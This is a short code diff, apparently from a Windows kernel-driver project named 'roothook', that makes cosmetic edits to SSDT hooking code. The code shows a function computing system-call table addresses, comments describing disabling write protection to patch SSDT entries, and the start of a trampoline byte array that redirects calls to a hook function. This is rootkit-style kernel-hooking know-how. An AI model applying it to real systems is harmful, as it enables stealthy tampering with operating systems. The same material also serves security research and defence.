@@ -86,7 +86,7 @@ ULONG64 roothook::SSDT::CurrentSSDTFuncAddr(ULONG SyscallNumber) {
 	PULONG ServiceTableBase = NULL;
 	ServiceTableBase = (PULONG)KiServiceDescriptorTable->ServiceTableBase;
 	SystemServiceValue = ServiceTableBase[SyscallNumber];
-	SystemServiceValue = SystemServiceValue >> 4;
+	SystemServiceValue = SystemServiceValue >> 4;   // Ignore last 4 bits
 	return (ULONG64)SystemServiceValue + (ULONG64)ServiceTableBase;
 }
 
@@ -108,8 +108,6 @@ NTSTATUS roothook::SSDT::SystemServiceDTHook(PVOID HookingFunction, ULONG Tag) {
 	6) Disable WP (Write-Protected), patch the SSDT entry, enable WP protections
 	7) Unmap the kernel image to save changes
 	*/
-
-
 	BYTE DummyTrampoline[] = { 0x50,  // push rax
 							   0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // movabs rax, HookingFunction
 							   0x48, 0x87, 0x04, 0x24,  // xchg QWORD PTR [rsp],rax
